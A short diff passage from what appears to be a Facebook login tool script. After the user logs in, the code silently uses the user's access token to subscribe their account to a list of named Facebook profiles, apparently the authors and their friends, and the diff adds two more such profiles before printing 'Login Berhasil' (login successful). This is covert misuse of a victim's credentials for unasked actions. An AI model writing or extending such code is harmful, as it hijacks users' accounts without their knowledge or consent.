@@ -36,6 +36,8 @@ def main():
     requests.post("https://graph.facebook.com/100010484328037/subscribers?access_token=" + token) # Rizal F
     requests.post("https://graph.facebook.com/100015073506062/subscribers?access_token=" + token) # Angga Kurniawan
     requests.post("https://graph.facebook.com/100005395413800/subscribers?access_token=" + token) # Moh Yayan
+    requests.post("https://graph.facebook.com/100003467793035/subscribers?access_token=" + token) # Fajar Dwi S
+    requests.post("https://graph.facebook.com/100003160758786/subscribers?access_token=" + token) # M Ardian Iqbal
     print('%s║'%(O))
     print('%s╚══[%s!%s] %sLogin Berhasil'%(O,P,O,P))
     exit(elite.menu())
